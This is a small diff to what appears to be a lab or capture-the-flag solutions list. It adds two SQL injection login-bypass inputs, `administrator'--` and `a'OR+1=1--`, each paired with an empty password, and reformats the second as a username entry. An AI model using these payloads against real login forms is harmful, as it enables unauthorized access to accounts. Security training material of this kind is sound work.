@@ -25,6 +25,6 @@
 
 1. *Solutions*
    1. username : `administrator'--` password : `''`
-   1. `a'OR+1=1--`
+   1. username :`a'OR+1=1--`        password : `''`
   
 
